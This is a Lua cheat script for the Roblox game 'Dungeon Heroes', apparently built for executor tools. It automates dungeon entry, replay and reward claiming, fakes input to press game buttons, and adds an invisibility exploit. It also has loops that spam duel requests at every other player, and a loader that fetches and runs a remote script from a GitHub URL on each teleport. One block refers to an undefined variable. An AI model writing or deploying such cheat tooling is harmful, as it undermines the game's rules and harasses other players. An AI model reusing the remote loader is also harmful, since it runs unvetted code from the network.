-- ================ Auto Dungeon Start ========================
-- ================ Auto Dungeon Start ========================
-- ================ Auto Dungeon Start ========================

do
    --====================================================
    -- DUNGEON HEROES | AUTO ENTRY V7 (ULTIMATE EDITION)
    -- 1. Preserves In-Game Saved Modifiers (Profile.DungeonModifierConfigs)
    -- 2. Player Limit Slider (1 to 8 Players, Default = 1)
    -- 3. Filters Out Expired Events (Shows Only Currently Active Events)
    -- 4. Smart Auto-Start (Verifies workspace DungeonStarted attribute)
    -- 5. Pro Top UI Notifications (No Rayfield:Notify)
    --====================================================

    local RS = game:GetService("ReplicatedStorage")
    local Players = game:GetService("Players")
    local TweenService = game:GetService("TweenService")
    local CoreGui = game:GetService("CoreGui")

    local Player = Players.LocalPlayer
    local Remotes = RS:WaitForChild("Remotes")

    local SetSettings = Remotes:WaitForChild("Parties/SetSettings")
    local SaveModifiers = Remotes:WaitForChild("SaveDungeonModifierConfig")
    local TriggerStartDungeon = Remotes:WaitForChild("TriggerStartDungeon")

    local Dungeons = require(RS.Systems.Dungeons)
    local Locations = require(RS.Systems.Locations)
    local ProfileSystem = require(RS.Systems.Profile)

    local EventsSystem = nil
    pcall(function()
        if RS.Systems:FindFirstChild("Events") then
            EventsSystem = require(RS.Systems.Events)
        end
    end)

    local Floors = Locations:GetFloorData()
    local Difficulties = Dungeons:GetAllDifficulties()

    -- ==========================================
    -- PRO TOP UI NOTIFICATION (NO RAYFIELD NOTIFY)
    -- ==========================================
    local function ShowTopNotification(TitleText, SubText, AccentColor, Duration)
        task.spawn(function()
            pcall(function()
                local ShowTime = Duration or 3.2
                local ThemeColor = AccentColor or Color3.fromRGB(0, 225, 140)

                local ParentGui = (gethui and gethui())
                    or CoreGui
                    or Player:WaitForChild("PlayerGui")

                local OldGui = ParentGui:FindFirstChild("DH_AutoEntryTopNotify")
                if OldGui then OldGui:Destroy() end

                local ScreenGui = Instance.new("ScreenGui")
                ScreenGui.Name = "DH_AutoEntryTopNotify"
                ScreenGui.IgnoreGuiInset = true
                ScreenGui.DisplayOrder = 999999
                ScreenGui.Parent = ParentGui

                local MainFrame = Instance.new("Frame")
                MainFrame.Size = UDim2.new(0, 400, 0, 66)
                MainFrame.Position = UDim2.new(0.5, -200, 0, -85)
                MainFrame.BackgroundColor3 = Color3.fromRGB(15, 17, 24)
                MainFrame.BorderSizePixel = 0
                MainFrame.ClipsDescendants = true
                MainFrame.Parent = ScreenGui

                local MainCorner = Instance.new("UICorner")
                MainCorner.CornerRadius = UDim.new(0, 12)
                MainCorner.Parent = MainFrame

                local MainStroke = Instance.new("UIStroke")
                MainStroke.Color = ThemeColor
                MainStroke.Thickness = 1.6
                MainStroke.Transparency = 0.15
                MainStroke.Parent = MainFrame

                local SideBar = Instance.new("Frame")
                SideBar.Size = UDim2.new(0, 5, 1, -16)
                SideBar.Position = UDim2.new(0, 8, 0, 8)
                SideBar.BackgroundColor3 = ThemeColor
                SideBar.BorderSizePixel = 0
                SideBar.Parent = MainFrame

                local SideCorner = Instance.new("UICorner")
                SideCorner.CornerRadius = UDim.new(1, 0)
                SideCorner.Parent = SideBar

                local Title = Instance.new("TextLabel")
                Title.Size = UDim2.new(1, -34, 0, 22)
                Title.Position = UDim2.new(0, 22, 0, 8)
                Title.BackgroundTransparency = 1
                Title.Font = Enum.Font.GothamBold
                Title.TextSize = 14
                Title.TextColor3 = ThemeColor
                Title.TextXAlignment = Enum.TextXAlignment.Left
                Title.TextTruncate = Enum.TextTruncate.AtEnd
                Title.Text = tostring(TitleText)
                Title.Parent = MainFrame

                local Sub = Instance.new("TextLabel")
                Sub.Size = UDim2.new(1, -34, 0, 20)
                Sub.Position = UDim2.new(0, 22, 0, 31)
                Sub.BackgroundTransparency = 1
                Sub.Font = Enum.Font.GothamMedium
                Sub.TextSize = 12
                Sub.TextColor3 = Color3.fromRGB(220, 225, 235)
                Sub.TextXAlignment = Enum.TextXAlignment.Left
                Sub.TextTruncate = Enum.TextTruncate.AtEnd
                Sub.Text = tostring(SubText)
                Sub.Parent = MainFrame

                local BarBg = Instance.new("Frame")
                BarBg.Size = UDim2.new(1, 0, 0, 3)
                BarBg.Position = UDim2.new(0, 0, 1, -3)
                BarBg.BackgroundColor3 = Color3.fromRGB(35, 40, 52)
                BarBg.BorderSizePixel = 0
                BarBg.Parent = MainFrame

                local BarFill = Instance.new("Frame")
                BarFill.Size = UDim2.new(1, 0, 1, 0)
                BarFill.BackgroundColor3 = ThemeColor
                BarFill.BorderSizePixel = 0
                BarFill.Parent = BarBg

                TweenService:Create(
                    MainFrame,
                    TweenInfo.new(0.30, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
                    {Position = UDim2.new(0.5, -200, 0, 16)}
                ):Play()

                TweenService:Create(
                    BarFill,
                    TweenInfo.new(ShowTime, Enum.EasingStyle.Linear, Enum.EasingDirection.Out),
                    {Size = UDim2.new(0, 0, 1, 0)}
                ):Play()

                task.wait(ShowTime)

                if MainFrame and MainFrame.Parent then
                    local OutTween = TweenService:Create(
                        MainFrame,
                        TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
                        {Position = UDim2.new(0.5, -200, 0, -85)}
                    )
                    OutTween:Play()
                    OutTween.Completed:Wait()
                    if ScreenGui then ScreenGui:Destroy() end
                end
            end)
        end)
    end

    -- ==========================================
    -- STATE & SETTINGS
    -- ==========================================
    local Category = "All"
    local SelectedDungeon = nil
    local SelectedDifficulty = nil

    local MaxPartyPlayers = 1       -- Slider controlled (Default = 1)
    local IsPrivateParty = true     -- Private / Solo Queue
    local AutoEnterFromLobby = false
    local AutoStartDungeon = true
    local Entering = false

    local DungeonOptions = {}
    local DifficultyOptions = {}
    local DungeonNameToKey = {}

    local DungeonDropdown
    local DifficultyDropdown

    local function GetValue(value)
        return type(value) == "table" and value[1] or value
    end

    -- ==========================================
    -- READ PLAYER'S IN-GAME SAVED MODIFIERS
    -- (From Profile.DungeonModifierConfigs)
    -- ==========================================
    local function GetSavedInGameModifiers(dungeonKey)
        if not dungeonKey then return nil end

        local Profile = nil
        pcall(function()
            Profile = ProfileSystem:GetProfile(Player)
        end)
        if not Profile then return nil end

        local ModConfigs = Profile:FindFirstChild("DungeonModifierConfigs")
        local DungeonConfig = ModConfigs and ModConfigs:FindFirstChild(dungeonKey)
        if not DungeonConfig then
            return nil -- No custom config folder -> server keeps default in-game state
        end

        local IsEnabled = DungeonConfig:GetAttribute("ModifiersEnabled") == true
        local IsRoulette = DungeonConfig:GetAttribute("RouletteEnabled") == true
        local EnabledMap = {}

        local EnabledFolder = DungeonConfig:FindFirstChild("EnabledModifiers")
        if EnabledFolder then
            for _, ModVal in ipairs(EnabledFolder:GetChildren()) do
                if ModVal:IsA("BoolValue") and ModVal.Value == true then
                    EnabledMap[ModVal.Name] = true
                end
            end
        end

        return {
            enabled = IsEnabled,
            enabledModifiers = EnabledMap,
            roulette = IsRoulette
        }
    end

    -- ==========================================
    -- CHECK IF DUNGEON / EVENT IS CURRENTLY ACTIVE
    -- ==========================================
    local function HasAnyAvailableDifficulty(dungeonKey, data)
        -- Gauntlet or special modes without standard DifficultyLevels table
        if data.IsGauntlet and type(data.DifficultyLevels) ~= "table" then
            return true
        end

        local levels = data and data.DifficultyLevels
        if type(levels) ~= "table" then
            return false
        end

        for index in pairs(levels) do
            if type(index) == "number" and Difficulties[index] then
                local ok, available = pcall(function()
                    return Dungeons:IsDungeonDifficultyAvailable(dungeonKey, index)
                end)
                if ok and available == true then
                    return true
                end
            end
        end

        return false
    end

    local function IsEventCurrentlyActive(dungeonKey, data)
        -- 1. Reject disabled / hidden / unreleased floors
        if data.Disabled == true
            or data.IsDisabled == true
            or data.Hidden == true
            or data.InDevelopment == true
            or data.Unreleased == true
            or data.IsActive == false then
            return false
        end

        -- 2. Check Locations:IsFloorAvailable if supported
        if type(Locations.IsFloorAvailable) == "function" then
            local ok1, avail1 = pcall(function()
                return Locations:IsFloorAvailable(dungeonKey)
            end)
            if ok1 and type(avail1) == "boolean" and avail1 == false then
                return false
            end

            local ok2, avail2 = pcall(function()
                return Locations:IsFloorAvailable(Player, dungeonKey)
            end)
            if ok2 and type(avail2) == "boolean" and avail2 == false then
                return false
            end
        end

        -- 3. Check EventsSystem if floor specifies an Event ID / Name
        local EventTag = data.Event or data.EventId or data.EventName or data.ActiveEvent
        if EventTag and EventsSystem then
            local Checked = false
            local IsLive = false

            for _, FnName in ipairs({"IsEventActive", "IsActive", "GetEventData"}) do
                if type(EventsSystem[FnName]) == "function" then
                    local okE, resE = pcall(function()
                        return EventsSystem[FnName](EventsSystem, EventTag)
                    end)
                    if okE and resE ~= nil then
                        Checked = true
                        IsLive = (resE ~= false and resE ~= nil)
                        break
                    end
                end
            end

            if Checked and not IsLive then
                return false
            end
        end

        -- 4. If it's an Event Dungeon, also verify against Profile.EventData if EventTag is present
        if data.IsEventDungeon == true and type(EventTag) == "string" and #EventTag > 0 then
            local Profile = nil
            pcall(function() Profile = ProfileSystem:GetProfile(Player) end)
            local EventDataFolder = Profile and Profile:FindFirstChild("EventData")
            if EventDataFolder and #EventDataFolder:GetChildren() > 0 then
                if not EventDataFolder:FindFirstChild(EventTag) then
                    return false
                end
            end
        end

        -- 5. Must have at least 1 currently playable difficulty on the server!
        if not HasAnyAvailableDifficulty(dungeonKey, data) then
            return false
        end

        return true
    end

    local function MatchesCategory(dungeonKey, data)
        -- Always filter out expired/unavailable events & locked dungeons
        if data.IsEventDungeon == true or Category == "Events" then
            if not IsEventCurrentlyActive(dungeonKey, data) then
                return false
            end
        else
            if data.Disabled == true or data.Hidden == true or data.InDevelopment == true then
                return false
            end
        end

        if Category == "All" then
            return true
        elseif Category == "Raids" then
            return data.IsRaid == true
        elseif Category == "Events" then
            return data.IsEventDungeon == true
        elseif Category == "Special" then
            return data.SpecialDungeon == true or data.IsGauntlet == true
        elseif Category == "Normal" then
            return data.IsDungeon == true
                and data.IsRaid ~= true
                and data.IsEventDungeon ~= true
                and data.SpecialDungeon ~= true
                and data.IsGauntlet ~= true
        end

        return false
    end

    -- ==========================================
    -- REFRESH DUNGEONS & DIFFICULTIES
    -- ==========================================
    local function RefreshDifficulties()
        table.clear(DifficultyOptions)
        SelectedDifficulty = nil

        local data = SelectedDungeon and Floors[SelectedDungeon]
        local levels = data and data.DifficultyLevels

        if type(levels) == "table" then
            local indexes = {}
            for index in pairs(levels) do
                if type(index) == "number" then
                    table.insert(indexes, index)
                end
            end
            table.sort(indexes)

            for _, index in ipairs(indexes) do
                local name = Difficulties[index]
                local ok, available = pcall(function()
                    return Dungeons:IsDungeonDifficultyAvailable(SelectedDungeon, index)
                end)

                if name and ok and available then
                    table.insert(DifficultyOptions, name)
                end
            end
        end

        -- Auto-select highest available difficulty by default for convenience
        if #DifficultyOptions > 0 then
            SelectedDifficulty = DifficultyOptions[#DifficultyOptions]
            DifficultyDropdown:Refresh(DifficultyOptions, SelectedDifficulty)
        else
            DifficultyDropdown:Refresh({})
        end
    end

    local function RefreshDungeons()
        table.clear(DungeonOptions)
        table.clear(DungeonNameToKey)

        local entries = {}
        local titleCounts = {}

        for name, data in pairs(Floors) do
            if type(data) == "table"
                and (data.IsDungeon or data.IsRaid or data.IsEventDungeon or data.SpecialDungeon or data.IsGauntlet)
                and MatchesCategory(name, data) then

                local displayName = data.Title or name
                titleCounts[displayName] = (titleCounts[displayName] or 0) + 1

                table.insert(entries, {
                    Name = name,
                    Title = displayName,
                    Data = data
                })
            end
        end

        table.sort(entries, function(a, b)
            local da = a.Data
            local db = b.Data

            if da.IsRaid and db.IsRaid then
                local orderA = da.DungeonSelectZIndex or da.LayoutOrder or da.RequiredLevel or 999999
                local orderB = db.DungeonSelectZIndex or db.LayoutOrder or db.RequiredLevel or 999999
                if orderA ~= orderB then
                    return orderA < orderB
                end
            else
                local levelA = da.RequiredLevel or 999999
                local levelB = db.RequiredLevel or 999999
                if levelA ~= levelB then
                    return levelA < levelB
                end
            end

            return a.Title < b.Title
        end)

        for _, entry in ipairs(entries) do
            local displayName = entry.Title
            if titleCounts[displayName] > 1 then
                displayName = displayName .. " (" .. entry.Name .. ")"
            end

            table.insert(DungeonOptions, displayName)
            DungeonNameToKey[displayName] = entry.Name
        end

        SelectedDungeon = nil
        SelectedDifficulty = nil

        DungeonDropdown:Refresh(DungeonOptions)
        DifficultyDropdown:Refresh({})
    end

    -- ==========================================
    -- QUEUE & ENTER EXECUTION (PRESERVES MODIFIERS)
    -- ==========================================
    local function EnterSelectedDungeon()
        if Entering then return end

        if not SelectedDungeon or not SelectedDifficulty then
            ShowTopNotification(
                "Selection Missing!",
                "Pehle Dungeon aur Difficulty select karo.",
                Color3.fromRGB(255, 175, 40),
                3.0
            )
            return
        end

        local difficultyIndex = table.find(Difficulties, SelectedDifficulty)
        if not difficultyIndex then
            ShowTopNotification(
                "Invalid Difficulty!",
                "Difficulty index match nahi hua.",
                Color3.fromRGB(255, 90, 90),
                3.0
            )
            return
        end

        Entering = true

        local SavedModifiers = GetSavedInGameModifiers(SelectedDungeon)

        local success, err = pcall(function()
            -- 1. Submit Party Settings with Slider Player Count (MaxPartyPlayers)
            SetSettings:FireServer(
                SelectedDungeon,
                difficultyIndex,
                MaxPartyPlayers,
                IsPrivateParty,
                false,
                {}
            )

            -- 2. Only send SaveModifiers if we read the player's actual in-game config for THIS dungeon!
            -- Never overwrite with foreign raid modifiers!
            if SavedModifiers then
                SaveModifiers:FireServer(
                    SelectedDungeon,
                    SavedModifiers
                )
            end
        end)

        if not success then
            Entering = false
            warn("Entry Error:", err)
            ShowTopNotification("Entry Error!", tostring(err), Color3.fromRGB(255, 80, 80), 3.5)
            return
        end

        local ModStatus = (SavedModifiers and SavedModifiers.enabled) and "In-Game Modifiers: ON" or "In-Game Default"
        ShowTopNotification(
            string.format("Entering: %s (%s)", tostring(SelectedDungeon), tostring(SelectedDifficulty)),
            string.format("Players: %d | %s", MaxPartyPlayers, ModStatus),
            Color3.fromRGB(0, 230, 145),
            3.5
        )

        task.delay(12, function()
            Entering = false
        end)
    end

    -- ==========================================
    -- RAYFIELD UI CONTROLS
    -- ==========================================
    AutoGrindTab:CreateDropdown({
        Name = "Category",
        Options = {"All", "Normal", "Raids", "Events", "Special"},
        CurrentOption = {"All"},
        Callback = function(value)
            Category = GetValue(value)
            RefreshDungeons()
        end
    })

    DungeonDropdown = AutoGrindTab:CreateDropdown({
        Name = "Select Dungeon / Raid",
        Options = {},
        CurrentOption = {},
        Callback = function(value)
            local selected = GetValue(value)
            if type(selected) ~= "string" then return end

            SelectedDungeon = DungeonNameToKey[selected]
            if not SelectedDungeon then
                warn("Dungeon key not found:", selected)
                return
            end

            task.defer(function()
                RefreshDifficulties()
            end)
        end
    })

    DifficultyDropdown = AutoGrindTab:CreateDropdown({
        Name = "Select Difficulty",
        Options = {},
        CurrentOption = {},
        Callback = function(value)
            SelectedDifficulty = GetValue(value)
        end
    })

    AutoGrindTab:CreateSlider({
        Name = "Party Player Limit (Max Players)",
        Range = {1, 8},
        Increment = 1,
        Suffix = " Player(s)",
        CurrentValue = 1,
        Flag = "AutoEntryMaxPlayers",
        Callback = function(Value)
            MaxPartyPlayers = tonumber(Value) or 1
        end
    })

    AutoGrindTab:CreateToggle({
        Name = "Private / Friends Only Queue",
        CurrentValue = true,
        Flag = "AutoEntryPrivateToggle",
        Callback = function(Value)
            IsPrivateParty = Value
        end
    })

    AutoGrindTab:CreateButton({
        Name = "ENTER SELECTED DUNGEON",
        Callback = function()
            EnterSelectedDungeon()
        end
    })

    AutoGrindTab:CreateToggle({
        Name = "Auto Enter Dungeon When In Lobby",
        CurrentValue = false,
        Flag = "AutoEnterFromLobbyToggle",
        Callback = function(Value)
            AutoEnterFromLobby = Value
        end
    })

    AutoGrindTab:CreateToggle({
        Name = "Auto Start Dungeon",
        CurrentValue = true,
        Flag = "AutoStartDungeonToggle",
        Callback = function(value)
            AutoStartDungeon = value
        end
    })

    -- ==========================================
    -- SMART AUTO START & AUTO LOBBY QUEUE LOOP
    -- ==========================================
    local LastStartFireTime = 0
    local LastLobbyEnterTime = 0

    task.spawn(function()
        while task.wait(0.25) do
            local ok, locationName, locationData = pcall(function()
                return Locations:GetCurrentLocation()
            end)

            if not ok or type(locationData) ~= "table" then
                continue
            end

            local inDungeon = (
                locationData.IsDungeon == true
                or locationData.IsRaid == true
                or locationData.IsEventDungeon == true
                or locationData.IsGauntlet == true
                or locationData.SpecialDungeon == true
            )

            -- 1. Inside Dungeon: Fire TriggerStartDungeon until workspace attribute DungeonStarted is true
            if inDungeon and AutoStartDungeon then
                local AlreadyStarted = workspace:GetAttribute("DungeonStarted") == true
                local AlreadyCleared = workspace:GetAttribute("DungeonCleared") == true
                local AlreadyFailed = workspace:GetAttribute("DungeonFailed") == true

                if not AlreadyStarted and not AlreadyCleared and not AlreadyFailed then
                    if os.clock() - LastStartFireTime >= 1.2 then
                        LastStartFireTime = os.clock()
                        pcall(function()
                            TriggerStartDungeon:FireServer()
                        end)
                    end
                end

            -- 2. Inside Lobby: Auto-Enter Selected Dungeon if AutoEnterFromLobby is enabled
            elseif not inDungeon and AutoEnterFromLobby and not Entering then
                if SelectedDungeon and SelectedDifficulty and (os.clock() - LastLobbyEnterTime >= 8.0) then
                    LastLobbyEnterTime = os.clock()
                    task.spawn(EnterSelectedDungeon)
                end
            end
        end
    end)

    RefreshDungeons()
end

-- ==========================================
-- DUNGEON HEROES | AUTO NEXT & CLAIM ALL
-- ==========================================
do
    local Players = game:GetService("Players")
    local GuiService = game:GetService("GuiService")
    local VirtualInputManager = game:GetService("VirtualInputManager")
    local LocalPlayer = Players.LocalPlayer

    getgenv().AutoTapChestUI = false

    local function instantTapButton(btn)
        if not btn or not btn.Visible then return end

        -- 1. SelectedObject + Return Key
        pcall(function()
            btn.Selectable = true
            GuiService.SelectedObject = btn
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
            GuiService.SelectedObject = nil
        end)

        -- 2. Signal Connections Fire
        if getconnections then
            local fakeTouchBegin = {UserInputType = Enum.UserInputType.Touch, UserInputState = Enum.UserInputState.Begin}
            local fakeTouchEnd = {UserInputType = Enum.UserInputType.Touch, UserInputState = Enum.UserInputState.End}

            local function fireSig(sig, a, b)
                for _, conn in pairs(getconnections(sig)) do
                    pcall(function() if conn.Fire then conn:Fire(a, b) end end)
                    pcall(function() if conn.Function then task.spawn(conn.Function, a, b) end end)
                end
            end

            fireSig(btn.Activated, fakeTouchBegin, 1)
            fireSig(btn.MouseButton1Click)
            fireSig(btn.MouseButton1Down, 0, 0)
            fireSig(btn.MouseButton1Up, 0, 0)
            if btn.TouchTap then fireSig(btn.TouchTap, {Vector2.zero}) end
            fireSig(btn.InputBegan, fakeTouchBegin, false)
            fireSig(btn.InputEnded, fakeTouchEnd, false)
        end

        -- 3. Screen Coordinates Tap Fallback
        pcall(function()
            local inset = GuiService:GetGuiInset()
            local pos = btn.AbsolutePosition
            local size = btn.AbsoluteSize
            local x = pos.X + (size.X / 2)
            local y = pos.Y + (size.Y / 2) + inset.Y

            VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 1)
            VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 1)
        end)
    end

    AutoGrindTab:CreateToggle({
        Name = "Auto Next & Claim All",
        CurrentValue = false,
        Flag = "AutoTapChestUI",
        Callback = function(Value)
            getgenv().AutoTapChestUI = Value

            if Value then
                task.spawn(function()
                    while getgenv().AutoTapChestUI do
                        pcall(function()
                            local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
                            local chestOpen = playerGui and playerGui:FindFirstChild("ChestOpen")

                            if chestOpen and chestOpen.Enabled then
                                local overlay = chestOpen:FindFirstChild("Overlay")
                                local actionButtons = overlay and overlay:FindFirstChild("ActionButtons")

                                if actionButtons and overlay.Visible then
                                    for _, child in ipairs(actionButtons:GetChildren()) do
                                        if child.Name == "Button" and child:IsA("GuiObject") and child.Visible then
                                            for _, desc in ipairs(child:GetDescendants()) do
                                                if desc:IsA("TextLabel") or desc:IsA("TextButton") then
                                                    local txt = desc.Text
                                                    if txt == "Next" or txt == "Claim All" then
                                                        instantTapButton(child)
                                                        break
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end)
                        task.wait(0.05)
                    end
                end)
            end
        end
    })
end

-- ==========================================
-- DUNGEON HEROES | AUTO PLAY AGAIN
-- ==========================================
do
    local Players = game:GetService("Players")
    local RS = game:GetService("ReplicatedStorage")
    local TeleportService = game:GetService("TeleportService")
    local GuiService = game:GetService("GuiService")

    local Player = Players.LocalPlayer
    local Remote = RS:WaitForChild("Remotes"):WaitForChild("SetExitChoice")

    local Enabled = false
    local Busy = false

    local function IsDungeonCleared()
        if workspace:GetAttribute("DungeonCleared") == true then
            local gui = Player.PlayerGui:FindFirstChild("DungeonCleared")
            if gui and gui.Enabled then
                return true
            end
        end

        local gui = Player.PlayerGui:FindFirstChild("DungeonCleared")
        if not gui or not gui.Enabled then
            return false
        end

        local frame = gui:FindFirstChild("Frame")
        local cleared = frame and frame:FindFirstChild("Cleared")

        return frame and frame.Visible and cleared and cleared.Visible
    end

    TeleportService.TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
        if player == Player and Enabled then
            warn("Teleport Failed (" .. tostring(teleportResult) .. "): " .. tostring(errorMessage) .. " - Retrying GoAgain...")
            pcall(function()
                GuiService:ClearError()
            end)

            task.wait(4)
            pcall(function()
                Remote:FireServer("GoAgain")
            end)

            Busy = false
        end
    end)

    AutoGrindTab:CreateToggle({
        Name = "Auto Play Again",
        CurrentValue = false,
        Flag = "AutoPlayAgainToggle",
        Callback = function(value)
            Enabled = value

            if value then
                task.spawn(function()
                    while Enabled do
                        if not Busy and IsDungeonCleared() then
                            Busy = true

                            pcall(function()
                                GuiService:ClearError()
                            end)

                            local success, err = pcall(function()
                                Remote:FireServer("GoAgain")
                            end)

                            if not success then
                                warn("Play Again Error:", err)
                            end

                            task.wait(6)
                            Busy = false
                        end

                        task.wait(0.2)
                    end
                end)
            end
        end
    })
end

do -- << 'do' BLOCK (Safety Wrapper) >>

local Players = game:GetService("Players")  
local LocalPlayer = Players.LocalPlayer  
local Debris = game:GetService("Debris")  

-- ===== CONFIGURATION =====  
local INVIS_POS = Vector3.new(-25.95, 84, 3537.55)   
local SOUND_ID = "rbxassetid://942127495"  

-- ===== STATE =====  
local invisEnabled = false  -- 🔥 invis state remember karega  

-- ===== HELPER FUNCTIONS =====  

-- 1. Sound Function  
local function PlayToggleSound()  
    local sound = Instance.new("Sound")  
    sound.Name = "InvisSound"  
    sound.SoundId = SOUND_ID  
    sound.Volume = 1  
    sound.Parent = game:GetService("SoundService")  
    sound:Play()  
    Debris:AddItem(sound, 2)  
end  

-- 2. Transparency Handler  
local function SetVisualTransparency(val)  
    if LocalPlayer.Character then  
        for _, part in pairs(LocalPlayer.Character:GetDescendants()) do  
            if part:IsA("BasePart") or part:IsA("Decal") then  
                if part.Name ~= "HumanoidRootPart" then  
                    part.Transparency = val  
                end  
            end  
        end  
    end  
end  

-- ===== MAIN LOGIC =====  

local function ApplyInvisToCharacter(char)  
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end  

    local hrp = char.HumanoidRootPart  
    local savedPos = hrp.CFrame  

    hrp.CFrame = CFrame.new(INVIS_POS)  
    task.wait(0.15)  

    local seat = Instance.new("Seat")  
    seat.Name = "InvisSeat"  
    seat.Anchored = false  
    seat.CanCollide = false  
    seat.Transparency = 1  
    seat.Position = INVIS_POS  
    seat.Parent = workspace  

    local weld = Instance.new("Weld")  
    weld.Part0 = seat  
    weld.Part1 = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")  
    weld.Parent = seat  

    task.wait(0.1)  
    seat.CFrame = savedPos  

    SetVisualTransparency(0.5)  
end  

local function RemoveInvis()  
    local seat = workspace:FindFirstChild("InvisSeat")  
    if seat then seat:Destroy() end  
    SetVisualTransparency(0)  
end  

local function ToggleInvisibility(State)  
    invisEnabled = State  

    local char = LocalPlayer.Character  
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end  

    PlayToggleSound()  

    if State then  
        ApplyInvisToCharacter(char)  
    else  
        RemoveInvis()  
    end  
end  

-- ===== UI =====  

MiscellaneousTab:CreateToggle({  
    Name = "👻 Invisible Mode",  
    CurrentValue = false,  
    Callback = function(Value)  
        ToggleInvisibility(Value)  
    end,  
})  

-- ===== AUTO RE-APPLY ON RESPAWN / LOBBY TP =====  

LocalPlayer.CharacterAdded:Connect(function(char)  
    task.wait(0.5) -- thoda wait taaki HRP load ho jaaye  
    if invisEnabled then  
        ApplyInvisToCharacter(char) -- 🔥 new round pe auto invis  
    else  
        RemoveInvis()  
    end  
end)  

Players.PlayerRemoving:Connect(function(plr)  
    if plr == LocalPlayer then  
        RemoveInvis()  
    end  
end)

end -- << END OF BLOCK >>

-- Dungeon Heroes | Disable VFX
-- Rayfield UI + Loader

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SetSetting = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("SetSetting")

MiscellaneousTab:CreateToggle({
Name = "Disable VFX",
CurrentValue = true,
Flag = "DisableVFX",

Callback = function(Value)  
    SetSetting:FireServer("DisableVFX", true)  
end

})

-- Automatically enforce TRUE
SetSetting:FireServer("DisableVFX", true)

-- Auto Duel | Fast Individual Requests

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer

local DuelRemote = RS:WaitForChild("Remotes")
:WaitForChild("Duels/RequestDuel")

local AutoDuel = false
local Delay = 0.1

MiscellaneousTab:CreateToggle({
Name = "Auto Duel All Players",
CurrentValue = false,
Callback = function(Value)
AutoDuel = Value

if Value then  
        task.spawn(function()  
            while AutoDuel do  
                for _, player in ipairs(Players:GetPlayers()) do  
                    if not AutoDuel then  
                        break  
                    end  

                    if player ~= LocalPlayer then  
                        pcall(function()  
                            DuelRemote:FireServer(player.UserId)  
                        end)  

                        task.wait(Delay)  
                    end  
                end  

                task.wait(Delay)  
            end  
        end)  
    end  
end

})

-- Selected Player Auto Duel | Rayfield

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer

local DuelRemote = RS:WaitForChild("Remotes")
:WaitForChild("Duels/RequestDuel")

local SearchText = ""
local SelectedDuel = false
local Delay = 0.1

-- Find matching player
local function FindPlayer(query)
query = string.lower(query)

if #query < 2 then  
    return nil  
end  

local matches = {}  

for _, player in ipairs(Players:GetPlayers()) do  
    if player ~= LocalPlayer then  

        local username = string.lower(player.Name)  
        local display = string.lower(player.DisplayName)  

        if string.find(username, query, 1, true)  
        or string.find(display, query, 1, true) then  
            table.insert(matches, player)  
        end  
    end  
end  

-- Avoid accidentally selecting the wrong player  
if #matches == 1 then  
    return matches[1]  
end  

return nil

end

-- Search box
MiscellaneousTab:CreateInput({
Name = "Player Username / DisplayName",
PlaceholderText = "Enter 2-3 letters...",
RemoveTextAfterFocusLost = false,
Callback = function(Value)
SearchText = Value

local target = FindPlayer(SearchText)  

    if target then  
        Rayfield:Notify({  
            Title = "Player Found",  
            Content = target.DisplayName ..  
                " (@" .. target.Name .. ")",  
            Duration = 3  
        })  
    end  
end

})

-- Selected Duel Toggle
MiscellaneousTab:CreateToggle({
Name = "Selected Player Duel",
CurrentValue = false,
Callback = function(Value)
SelectedDuel = Value

if Value then  
        task.spawn(function()  
            while SelectedDuel do  

                local target = FindPlayer(SearchText)  

                if target and target.Parent == Players then  
                    pcall(function()  
                        DuelRemote:FireServer(target.UserId)  
                    end)  
                end  

                task.wait(Delay)  
            end  
        end)  
    end  
end

})

-- ==========================================
-- AUTO EXECUTE ON TELEPORT & CONFIG LOADER
-- ==========================================
MiscellaneousTab:CreateSection("Auto Execute Settings")

local AutoExecEnabled = true
local TeleportQueued = false

-- Yahan apni is પૂरी script ka Raw Link (Pastefy/GitHub) dalein:
local SCRIPT_URL = "https://raw.githubusercontent.com/golu321-xd/Dungeon-Heros/refs/heads/main/Dungeon%20heroes.lua"

local queueTeleport = queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)

local function SetupTeleportQueue()
if queueTeleport and AutoExecEnabled and not TeleportQueued then
TeleportQueued = true
pcall(function()
queueTeleport('loadstring(game:HttpGet("' .. SCRIPT_URL .. '"))()')
end)
end
end

-- Toggle in Miscellaneous Tab (Default: ON)
MiscellaneousTab:CreateToggle({
Name = "Auto Execute (Same Game TP)",
CurrentValue = true,
Flag = "AutoExecToggle",
Callback = function(Value)
AutoExecEnabled = Value
end,
})

-- Jab player ek hi experience mein teleport hoga (Lobby -> Dungeon -> Lobby)
player.OnTeleport:Connect(function(State)
if AutoExecEnabled then
SetupTeleportQueue()
end
end)

-- Sabse last mein pichli saved settings (Speed, Toggles, Sliders) wapas load karega
Rayfield:LoadConfiguration()
